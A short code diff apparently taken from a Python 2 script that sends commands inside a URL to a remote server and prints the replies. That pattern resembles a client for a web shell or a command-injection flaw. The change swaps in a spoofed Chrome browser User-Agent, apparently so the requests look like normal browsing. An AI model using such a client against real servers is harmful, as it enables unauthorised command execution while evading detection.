@@ -19,7 +19,8 @@ if len(sys.argv) == 2:
             print "Bye!"
             sys.exit()
         try:
-            res=requests.get(s1+cmdstr+s2)
+            headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
+            res=requests.get(s1+cmdstr+s2,headers = headers)
             if res.status_code == 200:
                 print res.content
             else:
